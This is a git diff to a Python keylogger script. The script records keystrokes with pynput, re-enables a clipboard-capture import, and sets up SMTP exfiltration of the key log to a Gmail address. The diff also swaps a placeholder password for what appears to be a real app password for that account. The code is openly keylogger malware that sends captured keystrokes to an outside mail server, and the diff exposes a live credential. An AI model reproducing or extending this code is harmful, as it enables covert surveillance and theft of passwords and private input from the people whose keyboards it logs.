@@ -7,7 +7,7 @@ from email import encoders
 import smtplib
 import socket
 import platform
-# import win32clipboard
+import win32clipboard
 from pynput.keyboard import Key, Listener
 import time
 import os
@@ -21,16 +21,15 @@ from pathlib import Path
 
 key_log = "key_log.txt"
 
+#1234em@il
 email_address = "keylogcasus3@gmail.com"
-password = "123em@il"
+password = "taeqqnhicrgqwyje"
 toaddrs = "keylogcasus3@gmail.com"
 
 path_directory = Path(__file__)
 path_keylog = str(path_directory).replace("main.py", "key_log.txt")
 path_keylog_formatted = re.escape(str(path_keylog))
 print(path_keylog_formatted)
-
-
 
 
 def send_email(filename, attachment, toaddrs):
